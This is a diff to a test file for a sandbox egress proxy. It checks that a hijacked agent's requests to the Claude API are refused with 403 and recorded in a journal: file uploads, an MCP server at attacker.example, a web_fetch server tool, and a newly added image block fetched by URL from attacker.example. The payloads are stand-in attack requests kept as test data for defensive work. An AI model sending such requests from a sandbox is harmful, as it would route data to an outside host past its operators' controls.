@@ -88,15 +88,18 @@ describe.skipIf(!runnable)(`the Claude token stays out of the sandbox (${cli}, O
     for (const s of seen) expect(s).toMatchObject({ authorization: `Bearer ${FACTORY_TOKEN}`, apiKey: undefined });
   }, 240_000);
 
-  it('refuses what a hijacked agent would send with its own key: /v1/files, an MCP server, a server tool', async () => {
+  it('refuses what a hijacked agent would send with its own key: /v1/files, an MCP server, a server tool, an image by URL', async () => {
     const before = seen.length;
     expect(await agentFetch('/v1/files', 'x')).toBe('403');
     expect(await agentFetch('/v1/messages', JSON.stringify({ model: 'm', max_tokens: 1, messages: [], mcp_servers: [{ type: 'url', url: 'https://attacker.example/mcp', name: 'x' }] }))).toBe('403');
     expect(await agentFetch('/v1/messages', JSON.stringify({ model: 'm', max_tokens: 1, messages: [], tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }] }))).toBe('403');
+    const byUrl = { model: 'm', max_tokens: 1, messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'url', url: 'https://attacker.example/x.png' } }] }] };
+    expect(await agentFetch('/v1/messages', JSON.stringify(byUrl))).toBe('403');
     expect(seen.length).toBe(before);
     const journal = readFileSync(proxy.journalPath(runId), 'utf8').trim().split('\n').map((l) => JSON.parse(l) as EgressEntry);
     expect(journal).toContainEqual(expect.objectContaining({ method: 'POST', host: 'api.anthropic.com', path: '/v1/files', ok: false }));
     expect(journal).toContainEqual(expect.objectContaining({ path: '/v1/messages', ok: false, reason: 'Claude API body refused: mcp_servers' }));
     expect(journal).toContainEqual(expect.objectContaining({ path: '/v1/messages', ok: false, reason: 'Claude API body refused: server tool web_fetch_20250910' }));
+    expect(journal).toContainEqual(expect.objectContaining({ path: '/v1/messages', ok: false, reason: 'Claude API body refused: a image block sourced by url' }));
   }, 240_000);
 });
